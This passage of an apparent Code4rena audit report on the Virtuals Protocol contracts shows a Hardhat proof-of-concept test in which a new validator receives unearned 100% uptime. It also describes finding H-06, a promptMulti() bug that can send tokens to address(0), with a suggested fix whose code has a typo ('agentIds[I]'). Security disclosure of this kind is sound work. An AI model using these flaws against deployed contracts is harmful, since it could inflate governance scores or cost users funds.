class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Create second proposal but nobody votes on it yet\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const proposalId2 = await createContribution(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1, // virtualId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // coreId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // parentId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true, // isModel\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // no dataset dependency\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Second contribution\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor1.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [], // No votes\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e// - There are 2 total proposals\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // - validator1 has voted on 1 of 2 (50% participation)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 1. initialize validator2 with equal weight\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Give validator2 some tokens and stake them to get equal voting power\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(validator2.address, parseEther(\u0026quot;100000\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Register validator2 as a new validator\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.addValidator(1, validator2.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 2. Check validator scores\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator1Score = await agentNft.validatorScore(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      validator1.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator2Score = await agentNft.validatorScore(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      validator2.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const totalProposals = await agentNft.totalProposals(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Total proposals:\u0026quot;, totalProposals.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator1 score:\u0026quot;, validator1Score.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator2 score:\u0026quot;, validator2Score.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Validator1 has base score + 1 vote (has actually participated)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(totalProposals).to.equal(2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(validator1Score).to.equal(1); // participation (1)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(validator2Score).to.equal(2); // validator2 has base score (2) with no participation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Calculate uptime percentages\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator1Uptime = (validator1Score * 100n) / totalProposals;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator2Uptime = (validator2Score * 100n) / totalProposals;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator1 uptime percentage:\u0026quot;, validator1Uptime, \u0026quot;%\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator2 uptime percentage:\u0026quot;, validator2Uptime, \u0026quot;%\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // We expect validator2\u0026#39;s uptime percentage to be 100% despite not voting on any proposals\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(validator2Uptime).to.equal(100);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTest results:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"28\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  RewardsV2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTotal proposals: 2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator1 score: 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator2 score: 2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator1 uptime percentage: 50n %\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator2 uptime percentage: 100n %\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ✔ validators get unearned score, risk of exploits (1547ms)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1 passing (2s)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-06-missing-prevagentidupdate-in-promptmulti-function-may-cause-token-loss-by-transferring-to-address0\" style=\"position:relative;\"\u003e\u003ca href=\"#h-06-missing-prevagentidupdate-in-promptmulti-function-may-cause-token-loss-by-transferring-to-address0\" aria-label=\"h 06 missing prevagentidupdate in promptmulti function may cause token loss by transferring to address0 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-182\"\u003e[H-06] Missing \u003ccode\u003eprevAgentId\u003c/code\u003eupdate in \u003ccode\u003epromptMulti()\u003c/code\u003e function may cause token loss by transferring to \u003ccode\u003eaddress(0)\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-379\"\u003eVemus\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-656\"\u003e4ny0n3\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-578\"\u003ebareli\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-41\"\u003edjshan_eden\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-576\"\u003edustykid\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-828\"\u003eharsh123\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-191\"\u003eHeyu\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-34\"\u003eks__xxxxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-177\"\u003eodessos42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-73\"\u003eRaihan\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-95\"\u003esergei2340\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/AgentInference.sol#L80-L87\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/AgentInference.sol#L80-L87\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description\" aria-label=\"finding description permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003epromptMulti()\u003c/code\u003e function attempts to optimize token transfers by caching \u003ccode\u003eagentTba\u003c/code\u003e when the \u003ccode\u003eagentId\u003c/code\u003e remains unchanged. However, it fails to update \u003ccode\u003eprevAgentId\u003c/code\u003e inside the loop, which causes \u003ccode\u003eagentTba\u003c/code\u003e to remain outdated or uninitialized.\u003c/p\u003e\n\u003cp\u003eAs a result, if the first \u003ccode\u003eagentId\u003c/code\u003e equals the default \u003ccode\u003eprevAgentId\u003c/code\u003e (0), the contract never sets \u003ccode\u003eagentTba\u003c/code\u003e before the first transfer, causing a \u003ccode\u003esafeTransferFrom(sender, address(0), amount)\u003c/code\u003e, losing the user’s tokens.\u003c/p\u003e\n\u003cp\u003eAdditionally, when the same \u003ccode\u003eagentId\u003c/code\u003e reoccurs after a different one, \u003ccode\u003eagentTba\u003c/code\u003e may point to the wrong address, resulting in unexpected transfers.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eConsider implementing the following version of the code:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Initialize prevAgentId to a value that no valid agentId will ever match,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// ensuring the first iteration always enters the if-block.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Initialize agentTba to a placeholder; it will be set properly on the first iteration.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elen\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Amount must be \u0026gt; 0\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Validate if amounts = 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// If the agentId changes, fetch the corresponding agent TBA (target address)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtualInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid agent TBA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Ensure the target address is valid\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprevAgentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Update the cache to reflect the current agentId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einferenceCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]++;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ePrompt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epromptHashes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-3\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 